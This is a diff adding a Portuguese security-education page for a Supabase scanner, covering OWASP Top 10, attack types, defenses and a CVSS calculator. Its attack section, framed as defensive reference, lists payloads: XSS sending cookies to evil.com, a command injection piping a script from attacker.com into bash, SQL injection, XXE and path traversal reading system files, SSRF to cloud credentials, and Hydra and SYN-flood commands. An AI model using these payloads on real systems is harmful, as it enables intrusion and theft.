@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎓 Hacker Academia — Supabase Guard</title>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0a0e1a;
+      --bg2: #0d1117;
+      --panel: #111827;
+      --border: #1f2937;
+      --accent: #00d4ff;
+      --green: #00ff9f;
+      --purple: #a855f7;
+      --red: #ff0040;
+      --orange: #ff8c00;
+      --yellow: #ffff00;
+      --text: #e2e8f0;
+      --text-dim: #64748b;
+      --card: #161d2e;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; min-height: 100vh; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* ── Header ── */
+    .header {
+      background: linear-gradient(90deg, #0d1117 0%, #111827 100%);
+      border-bottom: 1px solid var(--border);
+      padding: 1rem 2rem;
+      display: flex;
+      align-items: center;
+      gap: 1.5rem;
+    }
+    .header-logo { font-family: 'JetBrains Mono', monospace; font-size: 1.1rem; font-weight: 700; color: var(--green); }
+    .header-logo span { color: var(--accent); }
+    .breadcrumb { color: var(--text-dim); font-size: 0.85rem; }
+    .breadcrumb a { color: var(--accent); }
+    .badge-v { background: var(--purple); color: #fff; font-size: 0.7rem; padding: 0.2rem 0.5rem; border-radius: 4px; font-weight: 600; }
+
+    /* ── Hero ── */
+    .hero {
+      text-align: center;
+      padding: 3rem 2rem 2rem;
+      background: linear-gradient(180deg, #0d1117 0%, var(--bg) 100%);
+      border-bottom: 1px solid var(--border);
+    }
+    .hero-title {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 2.2rem;
+      font-weight: 700;
+      color: var(--green);
+      text-shadow: 0 0 20px rgba(0,255,159,0.4);
+      margin-bottom: 0.5rem;
+    }
+    .hero-subtitle { color: var(--text-dim); font-size: 1rem; max-width: 600px; margin: 0 auto 1.5rem; }
+    .typewriter {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.9rem;
+      color: var(--accent);
+      background: rgba(0,212,255,0.08);
+      border: 1px solid rgba(0,212,255,0.2);
+      border-radius: 8px;
+      padding: 0.75rem 1.5rem;
+      display: inline-block;
+      min-width: 320px;
+      min-height: 1.5rem;
+    }
+    .cursor { display: inline-block; width: 2px; height: 1em; background: var(--accent); animation: blink 0.8s infinite; vertical-align: text-bottom; }
+    @keyframes blink { 0%,49% { opacity:1 } 50%,100% { opacity:0 } }
+
+    /* ── Search ── */
+    .search-bar {
+      display: flex;
+      justify-content: center;
+      padding: 1.5rem 2rem;
+      background: var(--bg);
+      border-bottom: 1px solid var(--border);
+    }
+    .search-input {
+      width: 100%;
+      max-width: 600px;
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 0.75rem 1rem;
+      color: var(--text);
+      font-size: 0.95rem;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .search-input:focus { border-color: var(--accent); }
+    .search-input::placeholder { color: var(--text-dim); }
+
+    /* ── Tabs ── */
+    .tabs { display: flex; gap: 0; background: var(--panel); border-bottom: 1px solid var(--border); overflow-x: auto; }
+    .tab {
+      padding: 1rem 1.5rem;
+      cursor: pointer;
+      font-size: 0.9rem;
+      font-weight: 500;
+      color: var(--text-dim);
+      border-bottom: 2px solid transparent;
+      white-space: nowrap;
+      transition: all 0.2s;
+      user-select: none;
+    }
+    .tab:hover { color: var(--text); background: rgba(255,255,255,0.03); }
+    .tab.active { color: var(--accent); border-bottom-color: var(--accent); }
+
+    /* ── Content ── */
+    .content { max-width: 1200px; margin: 0 auto; padding: 2rem; }
+    .tab-panel { display: none; }
+    .tab-panel.active { display: block; }
+
+    /* ── Cards ── */
+    .card-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 1.25rem; }
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 1.25rem;
+      transition: border-color 0.2s, transform 0.15s;
+    }
+    .card:hover { border-color: var(--accent); transform: translateY(-2px); }
+    .card-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 0.75rem; }
+    .card-icon { font-size: 1.4rem; }
+    .card-title { font-weight: 600; font-size: 1rem; }
+    .card-id { font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--text-dim); }
+    .card-desc { font-size: 0.85rem; color: var(--text-dim); line-height: 1.6; margin-bottom: 0.75rem; }
+    .badge-sev { display: inline-block; font-size: 0.7rem; font-weight: 600; padding: 0.2rem 0.5rem; border-radius: 4px; text-transform: uppercase; }
+    .sev-critical { background: rgba(255,0,64,0.2); color: var(--red); }
+    .sev-high { background: rgba(255,140,0,0.2); color: var(--orange); }
+    .sev-medium { background: rgba(255,255,0,0.15); color: var(--yellow); }
+    .sev-low { background: rgba(0,255,159,0.1); color: var(--green); }
+    .sev-info { background: rgba(0,212,255,0.1); color: var(--accent); }
+
+    /* ── Collapsible ── */
+    .collapsible summary {
+      cursor: pointer;
+      font-weight: 600;
+      font-size: 1rem;
+      padding: 1rem 1.25rem;
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      list-style: none;
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      transition: background 0.2s;
+      user-select: none;
+    }
+    .collapsible summary:hover { background: #1a2035; }
+    .collapsible[open] summary { border-radius: 8px 8px 0 0; border-bottom: none; background: #1a2035; }
+    .collapsible-body {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-top: none;
+      border-radius: 0 0 8px 8px;
+      padding: 1.25rem;
+    }
+    .attack-list { display: flex; flex-direction: column; gap: 1rem; }
+
+    /* ── Code blocks ── */
+    pre {
+      background: #060a14;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 0.875rem 1rem;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.8rem;
+      color: var(--green);
+      overflow-x: auto;
+      margin-top: 0.75rem;
+    }
+    code { font-family: 'JetBrains Mono', monospace; font-size: 0.85em; }
+
+    /* ── Glossary ── */
+    .glossary-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 0.75rem; }
+    .glossary-item { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 1rem; }
+    .glossary-term { font-weight: 700; color: var(--accent); font-family: 'JetBrains Mono', monospace; margin-bottom: 0.3rem; }
+    .glossary-def { font-size: 0.85rem; color: var(--text-dim); line-height: 1.5; }
+
+    /* ── CVSS Calculator ── */
+    .cvss-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 1rem; margin-bottom: 1.5rem; }
+    .cvss-field label { display: block; font-size: 0.8rem; font-weight: 600; color: var(--text-dim); margin-bottom: 0.4rem; text-transform: uppercase; letter-spacing: 0.05em; }
+    .cvss-field select {
+      width: 100%;
+      background: var(--panel);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 0.6rem 0.75rem;
+      color: var(--text);
+      font-size: 0.9rem;
+      outline: none;
+      cursor: pointer;
+    }
+    .cvss-field select:focus { border-color: var(--accent); }
+    .cvss-result {
+      background: var(--panel);
+      border: 2px solid var(--border);
+      border-radius: 12px;
+      padding: 2rem;
+      text-align: center;
+    }
+    .cvss-score { font-family: 'JetBrains Mono', monospace; font-size: 4rem; font-weight: 700; line-height: 1; }
+    .cvss-rating { font-size: 1.2rem; font-weight: 600; margin-top: 0.5rem; }
+    .cvss-vector { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--text-dim); margin-top: 1rem; word-break: break-all; }
+
+    /* ── Supabase tips ── */
+    .tip-list { display: flex; flex-direction: column; gap: 0.75rem; }
+    .tip {
+      background: var(--card);
+      border-left: 3px solid var(--accent);
+      border-radius: 0 8px 8px 0;
+      padding: 1rem 1.25rem;
+    }
+    .tip.danger { border-left-color: var(--red); }
+    .tip.warn { border-left-color: var(--orange); }
+    .tip.good { border-left-color: var(--green); }
+    .tip-title { font-weight: 600; margin-bottom: 0.3rem; }
+    .tip-body { font-size: 0.85rem; color: var(--text-dim); line-height: 1.6; }
+
+    /* ── Section title ── */
+    .section-title { font-size: 1.3rem; font-weight: 700; margin-bottom: 1.25rem; color: var(--green); display: flex; align-items: center; gap: 0.5rem; }
+    .section-desc { color: var(--text-dim); font-size: 0.9rem; margin-bottom: 1.5rem; line-height: 1.6; }
+    .attack-divider { height: 1px; background: var(--border); margin: 1rem 0; }
+
+    /* ── Defense table ── */
+    .def-table { width: 100%; border-collapse: collapse; font-size: 0.9rem; }
+    .def-table th { background: var(--panel); color: var(--accent); padding: 0.75rem 1rem; text-align: left; border-bottom: 1px solid var(--border); font-weight: 600; }
+    .def-table td { padding: 0.75rem 1rem; border-bottom: 1px solid var(--border); color: var(--text-dim); }
+    .def-table tr:hover td { background: rgba(255,255,255,0.02); color: var(--text); }
+
+    /* ── Responsive ── */
+    @media (max-width: 640px) {
+      .card-grid { grid-template-columns: 1fr; }
+      .hero-title { font-size: 1.5rem; }
+      .content { padding: 1rem; }
+      .tab { padding: 0.75rem 1rem; font-size: 0.8rem; }
+      .cvss-grid { grid-template-columns: 1fr 1fr; }
+    }
+
+    .hidden { display: none !important; }
+    .mt { margin-top: 1.5rem; }
+  </style>
+</head>
+<body>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-logo">SUPABASE <span>GUARD</span></div>
+  <div class="breadcrumb">
+    <a href="/">← Voltar ao Scanner</a> &rsaquo; <strong>🎓 Hacker Academia</strong>
+  </div>
+  <span class="badge-v">v3.3.0</span>
+</div>
+
+<!-- Hero -->
+<div class="hero">
+  <h1 class="hero-title">🎓 Hacker Academia</h1>
+  <p class="hero-subtitle">Aprenda segurança ofensiva e defensiva, OWASP Top 10, tipos de ataque, glossário e muito mais.</p>
+  <div class="typewriter" id="typewriter"></div>
+</div>
+
+<!-- Search -->
+<div class="search-bar">
+  <input class="search-input" type="text" id="searchInput" placeholder="🔍 Pesquisar em toda a academia (OWASP, XSS, CSRF, JWT, SQL...)">
+</div>
+
+<!-- Tabs -->
+<div class="tabs">
+  <div class="tab active" onclick="switchTab('owasp', this)">📋 OWASP Top 10</div>
+  <div class="tab" onclick="switchTab('attacks', this)">⚔️ Tipos de Ataque</div>
+  <div class="tab" onclick="switchTab('defense', this)">🛡️ Defesa (Blue Team)</div>
+  <div class="tab" onclick="switchTab('glossary', this)">📖 Glossário</div>
+  <div class="tab" onclick="switchTab('cvss', this)">🎯 Calculadora CVSS</div>
+  <div class="tab" onclick="switchTab('supabase', this)">🔷 Segurança Supabase</div>
+</div>
+
+<!-- Content -->
+<div class="content">
+
+  <!-- ── OWASP Top 10 ── -->
+  <div class="tab-panel active" id="panel-owasp">
+    <div class="section-title">📋 OWASP Top 10 (2021)</div>
+    <div class="section-desc">As 10 categorias de risco de segurança mais críticas em aplicações web, segundo o OWASP.</div>
+    <div class="card-grid">
+      <div class="card searchable">
+        <div class="card-header"><div class="card-icon">🔓</div><div><div class="card-title">A01 — Controle de Acesso Quebrado</div><div class="card-id">A01:2021</div></div></div>
+        <div class="card-desc">Falha nas restrições sobre o que usuários autenticados podem fazer. Inclui IDOR, escalada de privilégio e acesso a APIs sem autorização.</div>
+        <p><strong>Exemplo:</strong> <code>GET /api/users/1337</code> retorna dados de outro usuário sem verificação de ownership.</p>
+        <pre>// Fix: verificar ownership no servidor
+if (record.userId !== req.user.id) return res.status(403).json({ error: 'Forbidden' });</pre>
+        <span class="badge-sev sev-critical">Crítico</span>
+      </div>
+      <div class="card searchable">
+        <div class="card-header"><div class="card-icon">🔐</div><div><div class="card-title">A02 — Falhas Criptográficas</div><div class="card-id">A02:2021</div></div></div>
+        <div class="card-desc">Dados sensíveis transmitidos ou armazenados sem criptografia adequada. MD5/SHA1 para senhas, HTTP em vez de HTTPS, chaves hard-coded.</div>
+        <p><strong>Exemplo:</strong> Senha armazenada como MD5: <code>5f4dcc3b5aa765d61d8327deb882cf99</code> = "password"</p>
+        <pre># Fix: use bcrypt ou argon2
+import bcrypt
+hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))</pre>
+        <span class="badge-sev sev-critical">Crítico</span>
+      </div>
+      <div class="card searchable">
+        <div class="card-header"><div class="card-icon">💉</div><div><div class="card-title">A03 — Injeção</div><div class="card-id">A03:2021</div></div></div>
+        <div class="card-desc">SQL Injection, NoSQL Injection, Command Injection, LDAP Injection. Dados não confiáveis enviados como parte de um comando ou query.</div>
+        <p><strong>Exemplo SQL:</strong> <code>' OR 1=1 --</code></p>
+        <pre>// Fix: use prepared statements
+const result = await db.query('SELECT * FROM users WHERE id = $1', [userId]);</pre>
+        <span class="badge-sev sev-critical">Crítico</span>
+      </div>
+      <div class="card searchable">
+        <div class="card-header"><div class="card-icon">🏗️</div><div><div class="card-title">A04 — Design Inseguro</div><div class="card-id">A04:2021</div></div></div>
+        <div class="card-desc">Riscos relacionados a falhas de design e arquitetura. Ausência de threat modeling, falta de princípios de least privilege.</div>
+        <p><strong>Exemplo:</strong> Recuperação de senha via "pergunta secreta" facilmente adivinhável.</p>
+        <pre># Fix: use tokens temporários seguros
+import secrets
+reset_token = secrets.token_urlsafe(32)
+# Token válido por 15 minutos, hash armazenado no DB</pre>
+        <span class="badge-sev sev-high">Alto</span>
+      </div>
+      <div class="card searchable">
+        <div class="card-header"><div class="card-icon">⚙️</div><div><div class="card-title">A05 — Configuração Incorreta</div><div class="card-id">A05:2021</div></div></div>
+        <div class="card-desc">Configurações default inseguras, headers de segurança ausentes, permissões excessivas, debug ativado em produção.</div>
+        <p><strong>Exemplo:</strong> Stack trace exposto em resposta de erro com credenciais de banco.</p>
+        <pre># Fix: desative debug em produção
+DEBUG = os.environ.get('DEBUG', 'false').lower() == 'true'
+app.config['PROPAGATE_EXCEPTIONS'] = not DEBUG</pre>
+        <span class="badge-sev sev-high">Alto</span>
+      </div>
+      <div class="card searchable">
+        <div class="card-header"><div class="card-icon">📦</div><div><div class="card-title">A06 — Componentes Vulneráveis</div><div class="card-id">A06:2021</div></div></div>
+        <div class="card-desc">Uso de bibliotecas, frameworks e módulos com vulnerabilidades conhecidas. Log4Shell, Spring4Shell, node-ipc.</div>
+        <p><strong>Exemplo:</strong> <code>log4j 2.14.1</code> vulnerável a RCE via JNDI lookup.</p>
+        <pre>## Fix: audit regular de dependências
+npm audit fix
+pip install safety && safety check
+snyk test</pre>
+        <span class="badge-sev sev-high">Alto</span>
+      </div>
+      <div class="card searchable">
+        <div class="card-header"><div class="card-icon">🔑</div><div><div class="card-title">A07 — Autenticação Falha</div><div class="card-id">A07:2021</div></div></div>
+        <div class="card-desc">Sessões não invalidadas, senhas fracas permitidas, ausência de MFA, tokens JWT com algoritmo "none", credential stuffing.</div>
+        <p><strong>Exemplo JWT:</strong> <code>alg: "none"</code> permite bypass de verificação de assinatura.</p>
+        <pre>// Fix: sempre verifique o algoritmo
+jwt.verify(token, secret, { algorithms: ['HS256'] });</pre>
+        <span class="badge-sev sev-critical">Crítico</span>
+      </div>
+      <div class="card searchable">
+        <div class="card-header"><div class="card-icon">📊</div><div><div class="card-title">A08 — Falhas em Software e Integridade</div><div class="card-id">A08:2021</div></div></div>
+        <div class="card-desc">Desserialização insegura, atualizações não verificadas, pipelines CI/CD comprometidos, supply chain attacks.</div>
+        <p><strong>Exemplo:</strong> Pacote npm malicioso com mesmo nome de popular biblioteca (typosquatting).</p>
+        <pre># Fix: use lockfiles e verifique hashes
+npm ci --ignore-scripts  # usa package-lock.json
+pip install --require-hashes -r requirements.txt</pre>
+        <span class="badge-sev sev-high">Alto</span>
+      </div>
+      <div class="card searchable">
+        <div class="card-header"><div class="card-icon">📝</div><div><div class="card-title">A09 — Falhas em Logging e Monitoramento</div><div class="card-id">A09:2021</div></div></div>
+        <div class="card-desc">Eventos críticos não logados, logs sem integridade, ausência de alertas para atividades suspeitas, MTTR elevado após brecha.</div>
+        <p><strong>Exemplo:</strong> 10.000 tentativas de login não detectadas porque não há alertas de rate.</p>
+        <pre>// Fix: log eventos de segurança críticos
+logger.warn({ event: 'login_failed', ip: req.ip, user: email, count: attempts });</pre>
+        <span class="badge-sev sev-medium">Médio</span>
+      </div>
+      <div class="card searchable">
+        <div class="card-header"><div class="card-icon">🌐</div><div><div class="card-title">A10 — SSRF</div><div class="card-id">A10:2021</div></div></div>
+        <div class="card-desc">Server-Side Request Forgery: servidor faz requisições HTTP para URL controlada pelo atacante, acessando recursos internos como metadata AWS.</div>
+        <p><strong>Exemplo:</strong> <code>?url=http://169.254.169.254/latest/meta-data/</code></p>
+        <pre># Fix: valide e restrinja destinos
+ALLOWED_HOSTS = {"api.trusted.com", "cdn.trusted.com"}
+parsed = urlparse(url)
+if parsed.hostname not in ALLOWED_HOSTS:
+    raise ValueError("Host não permitido")</pre>
+        <span class="badge-sev sev-critical">Crítico</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Tipos de Ataque ── -->
+  <div class="tab-panel" id="panel-attacks">
+    <div class="section-title">⚔️ Tipos de Ataque</div>
+    <div class="section-desc">Referência rápida de ataques mais comuns com exemplos e payloads de referência (para fins educacionais defensivos).</div>
+    <div class="attack-list">
+
+      <details class="collapsible searchable">
+        <summary><span>💪</span> Brute Force & Credential Stuffing</summary>
+        <div class="collapsible-body">
+          <p class="card-desc">Tentativas massivas de login com senhas ou credenciais vazadas de outros serviços. Ferramentas: Hydra, Medusa, Burp Intruder.</p>
+          <pre>hydra -L users.txt -P passwords.txt https-post-form \
+  "site.com/auth/login:email=^USER^&password=^PASS^:Wrong password"</pre>
+          <p><strong>Defesa:</strong> Rate limiting, lockout após N falhas, CAPTCHA, MFA, monitorar IPs suspeitos.</p>
+        </div>
+      </details>
+
+      <details class="collapsible searchable">
+        <summary><span>🌊</span> DDoS (Distributed Denial of Service)</summary>
+        <div class="collapsible-body">
+          <p class="card-desc">Ataque que sobrecarrega servidor com volume massivo de requisições. Tipos: volumétrico (UDP flood), protocolo (SYN flood), camada 7 (HTTP flood).</p>
+          <pre># SYN Flood (conceitual — NÃO execute sem autorização)
+# hping3 --flood --syn --rand-source -p 80 target.com
+
+# Detecção com tcpdump
+tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' | head -20</pre>
+          <p><strong>Defesa:</strong> CDN (Cloudflare, AWS Shield), rate limiting por IP, WAF, anycast routing.</p>
+        </div>
+      </details>
+
+      <details class="collapsible searchable">
+        <summary><span>💉</span> SQL Injection</summary>
+        <div class="collapsible-body">
+          <p class="card-desc">Manipulação de queries SQL via inputs não sanitizados. Permite extração de dados, bypass de auth, execução de comandos (xp_cmdshell no MSSQL).</p>
+          <pre># Exemplos de payloads de detecção
+' OR 1=1 --
+' OR 'x'='x
+1'; DROP TABLE users; --
+' UNION SELECT username, password FROM users --
+' AND SLEEP(5) --    # Time-based blind</pre>
+          <p><strong>Defesa:</strong> Prepared statements, ORM, WAF, princípio de least privilege no DB.</p>
+        </div>
+      </details>
+
+      <details class="collapsible searchable">
+        <summary><span>📜</span> XSS (Cross-Site Scripting)</summary>
+        <div class="collapsible-body">
+          <p class="card-desc">Injeção de scripts maliciosos em páginas web. Tipos: Reflected (URL), Stored (persistido no DB), DOM-based (manipula o DOM client-side).</p>
+          <pre>&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;
+&lt;img src=x onerror="fetch('https://evil.com/'+btoa(document.cookie))"&gt;
+javascript:alert(document.domain)   /* em href= */</pre>
+          <p><strong>Defesa:</strong> Sanitize inputs, use Content Security Policy (CSP), HttpOnly cookies, textContent em vez de innerHTML.</p>
+        </div>
+      </details>
+
+      <details class="collapsible searchable">
+        <summary><span>🌍</span> SSRF (Server-Side Request Forgery)</summary>
+        <div class="collapsible-body">
+          <p class="card-desc">Força o servidor a fazer requisições para recursos internos. Pode acessar metadata cloud, serviços internos, bancos de dados não expostos.</p>
+          <pre># Payload clássico: AWS Instance Metadata
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# GCP metadata
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+# Bypass com redirect
+http://attacker.com/redirect?to=http://internal-service/admin</pre>
+          <p><strong>Defesa:</strong> Allowlist de hosts/IPs, bloquear ranges RFC1918, não passar URL diretamente do usuário.</p>
+        </div>
+      </details>
+
+      <details class="collapsible searchable">
+        <summary><span>🔄</span> CSRF (Cross-Site Request Forgery)</summary>
+        <div class="collapsible-body">
+          <p class="card-desc">Induz usuário autenticado a executar ações indesejadas. Explora confiança do servidor no browser do usuário.</p>
+          <pre>&lt;!-- Página maliciosa faz request para site autenticado --&gt;
+&lt;img src="https://bank.com/transfer?to=attacker&amount=1000"&gt;
+&lt;form action="https://app.com/change-email" method="POST"&gt;
+  &lt;input name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</pre>
+          <p><strong>Defesa:</strong> CSRF tokens, SameSite=Strict cookies, verificar Origin/Referer header, double submit cookie.</p>
+        </div>
+      </details>
+
+      <details class="collapsible searchable">
+        <summary><span>📦</span> XXE (XML External Entity)</summary>
+        <div class="collapsible-body">
+          <p class="card-desc">Injection em parsers XML. Pode ler arquivos do servidor (/etc/passwd), fazer SSRF, DoS via billion laughs attack.</p>
+          <pre>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+&lt;!-- Billion Laughs DoS --&gt;
+&lt;!ENTITY lol "lol"&gt;
+&lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;</pre>
+          <p><strong>Defesa:</strong> Desabilite DTD processing, use libraries com XXE protection por padrão (defusedxml em Python).</p>
+        </div>
+      </details>
+
+      <details class="collapsible searchable">
+        <summary><span>💻</span> RCE (Remote Code Execution)</summary>
+        <div class="collapsible-body">
+          <p class="card-desc">Execução arbitrária de código no servidor. Via command injection, desserialização insegura, vulnerabilidades em frameworks.</p>
+          <pre># Command Injection
+?filename=file.txt; cat /etc/passwd
+?host=127.0.0.1 | whoami
+?input=$(curl http://attacker.com/shell.sh | bash)
+
+# Node.js eval injection
+eval(req.query.code)  // NUNCA faça isso</pre>
+          <p><strong>Defesa:</strong> Nunca execute input do usuário, use allowlist para comandos, sandbox, princípio de least privilege.</p>
+        </div>
+      </details>
+
+      <details class="collapsible searchable">
+        <summary><span>📂</span> Path Traversal</summary>
+        <div class="collapsible-body">
+          <p class="card-desc">Acessa arquivos fora do diretório permitido. Ler arquivos de configuração, chaves privadas, senhas do sistema.</p>
+          <pre>GET /download?file=../../../etc/passwd
+GET /read?path=....//....//etc/shadow
+GET /view?doc=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</pre>
+          <p><strong>Defesa:</strong> Normalize paths antes de validar, use basename(), nunca concatene input diretamente em paths de arquivo.</p>
+        </div>
+      </details>
+
+      <details class="collapsible searchable">
+        <summary><span>📋</span> LDAP Injection</summary>
+        <div class="collapsible-body">
+          <p class="card-desc">Similar ao SQL injection mas para serviços de diretório LDAP. Pode bypassar autenticação ou extrair entradas do diretório.</p>
+          <pre># Bypass de autenticação LDAP
+username: *)(uid=*))(|(uid=*   # payload
+# Resulta em: (&(uid=*)(uid=*))(|(uid=*)(password=qualquer))
+# Query sempre verdadeira → bypass</pre>
+          <p><strong>Defesa:</strong> Escape special LDAP chars: <code>( ) * \ NUL</code>. Use libraries com LDAP-safe encoding.</p>
+        </div>
+      </details>
+
+    </div>
+  </div>
+
+  <!-- ── Defesa (Blue Team) ── -->
+  <div class="tab-panel" id="panel-defense">
+    <div class="section-title">🛡️ Defesa — Blue Team</div>
+    <div class="section-desc">Controles e técnicas de defesa para proteger aplicações web e APIs.</div>
+
+    <table class="def-table searchable" style="margin-bottom:2rem;">
+      <thead>
+        <tr>
+          <th>Controle</th>
+          <th>O que protege</th>
+          <th>Implementação</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>WAF (Web Application Firewall)</strong></td>
+          <td>SQLi, XSS, RCE, Path Traversal</td>
+          <td>Cloudflare WAF, AWS WAF, ModSecurity, NGINX + modsec</td>
+        </tr>
+        <tr>
+          <td><strong>Rate Limiting</strong></td>
+          <td>Brute Force, DDoS L7, Credential Stuffing</td>
+          <td>nginx limit_req, express-rate-limit, Redis sliding window</td>
+        </tr>
+        <tr>
+          <td><strong>Content Security Policy (CSP)</strong></td>
+          <td>XSS, Data Injection</td>
+          <td><code>Content-Security-Policy: default-src 'self'</code></td>
+        </tr>
+        <tr>
+          <td><strong>HSTS</strong></td>
+          <td>Downgrade attacks, MitM</td>
+          <td><code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code></td>
+        </tr>
+        <tr>
+          <td><strong>Input Validation</strong></td>
+          <td>Injection, XSS, Overflow</td>
+          <td>Zod/Joi/Pydantic, whitelist por tipo de campo</td>
+        </tr>
+        <tr>
+          <td><strong>Logging & SIEM</strong></td>
+          <td>Detecção de ataques, forensics</td>
+          <td>ELK Stack, Datadog, Splunk, Grafana Loki</td>
+        </tr>
+        <tr>
+          <td><strong>Patch Management</strong></td>
+          <td>Componentes vulneráveis</td>
+          <td>Dependabot, Renovate, npm audit, Snyk</td>
+        </tr>
+        <tr>
+          <td><strong>MFA / 2FA</strong></td>
+          <td>Credential theft, Account takeover</td>
+          <td>TOTP (Google Authenticator), WebAuthn/FIDO2, SMS (menos seguro)</td>
+        </tr>
+        <tr>
+          <td><strong>Secrets Management</strong></td>
+          <td>Key/credential exposure</td>
+          <td>HashiCorp Vault, AWS Secrets Manager, Doppler</td>
+        </tr>
+        <tr>
+          <td><strong>Zero Trust Network</strong></td>
+          <td>Lateral movement, internal threats</td>
+          <td>mTLS, service mesh (Istio), Tailscale, BeyondCorp</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="section-title mt">📜 Headers de Segurança HTTP</div>
+    <pre class="searchable">
+# Configuração completa de headers de segurança (nginx)
+add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
+add_header X-Frame-Options "DENY" always;
+add_header X-Content-Type-Options "nosniff" always;
+add_header X-XSS-Protection "1; mode=block" always;
+add_header Referrer-Policy "strict-origin-when-cross-origin" always;
+add_header Permissions-Policy "geolocation=(), camera=(), microphone=()" always;
+add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://*.supabase.co" always;
+    </pre>
+
+    <div class="section-title mt">🔒 Rate Limiting — Express.js</div>
+    <pre class="searchable">
+const rateLimit = require('express-rate-limit');
+
+// Limite geral
+app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));
+
+// Limite mais estrito para login
+app.use('/auth', rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 5,
+  skipSuccessfulRequests: true,
+  message: { error: 'Muitas tentativas. Tente em 15 minutos.' }
+}));
+    </pre>
+  </div>
+
+  <!-- ── Glossário ── -->
+  <div class="tab-panel" id="panel-glossary">
+    <div class="section-title">📖 Glossário de Segurança</div>
+    <div class="section-desc">Termos técnicos de segurança de A a Z com definições concisas.</div>
+    <div class="glossary-grid" id="glossaryGrid">
+      <!-- Populated by JS -->
+    </div>
+  </div>
+
+  <!-- ── Calculadora CVSS ── -->
+  <div class="tab-panel" id="panel-cvss">
+    <div class="section-title">🎯 Calculadora CVSS v3.1</div>
+    <div class="section-desc">Calcule o score CVSS v3.1 interativamente. O resultado é atualizado em tempo real conforme você altera os parâmetros.</div>
+
+    <div class="cvss-grid">
+      <div class="cvss-field">
+        <label>Attack Vector (AV)</label>
+        <select id="av" onchange="calcCVSS()">
+          <option value="N">Network (N) — 0.85</option>
+          <option value="A">Adjacent (A) — 0.62</option>
+          <option value="L">Local (L) — 0.55</option>
+          <option value="P">Physical (P) — 0.20</option>
+        </select>
+      </div>
+      <div class="cvss-field">
+        <label>Attack Complexity (AC)</label>
+        <select id="ac" onchange="calcCVSS()">
+          <option value="L">Low (L) — 0.77</option>
+          <option value="H">High (H) — 0.44</option>
+        </select>
+      </div>
+      <div class="cvss-field">
+        <label>Privileges Required (PR)</label>
+        <select id="pr" onchange="calcCVSS()">
+          <option value="N">None (N) — 0.85</option>
+          <option value="L">Low (L) — 0.62</option>
+          <option value="H">High (H) — 0.27</option>
+        </select>
+      </div>
+      <div class="cvss-field">
+        <label>User Interaction (UI)</label>
+        <select id="ui" onchange="calcCVSS()">
+          <option value="N">None (N) — 0.85</option>
+          <option value="R">Required (R) — 0.62</option>
+        </select>
+      </div>
+      <div class="cvss-field">
+        <label>Scope (S)</label>
+        <select id="s" onchange="calcCVSS()">
+          <option value="U">Unchanged (U)</option>
+          <option value="C">Changed (C)</option>
+        </select>
+      </div>
+      <div class="cvss-field">
+        <label>Confidentiality (C)</label>
+        <select id="ci" onchange="calcCVSS()">
+          <option value="N">None (N) — 0</option>
+          <option value="L">Low (L) — 0.22</option>
+          <option value="H">High (H) — 0.56</option>
+        </select>
+      </div>
+      <div class="cvss-field">
+        <label>Integrity (I)</label>
+        <select id="ii" onchange="calcCVSS()">
+          <option value="N">None (N) — 0</option>
+          <option value="L">Low (L) — 0.22</option>
+          <option value="H">High (H) — 0.56</option>
+        </select>
+      </div>
+      <div class="cvss-field">
+        <label>Availability (A)</label>
